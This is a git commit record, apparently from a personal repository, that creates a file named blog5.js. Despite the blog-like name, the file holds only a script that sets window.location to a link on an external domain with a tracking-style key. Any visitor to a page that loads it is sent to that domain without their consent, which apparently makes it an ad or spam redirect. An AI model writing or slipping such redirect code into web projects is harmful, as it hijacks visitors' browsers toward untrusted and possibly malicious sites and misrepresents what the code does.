78ff92ca753b491bc3a9aea33a5ad0d7b918c4b4
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2022-04-10 05:10:37 +0700

    Create blog5.js

---
+++ blog5.js
@@ -0,0 +1,7 @@
+var dataUrl = [
+
+'https://practicallysacrificestock.com/y508wur2?key=e57dc7d25ee44cdcbaf224d25522fa21'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
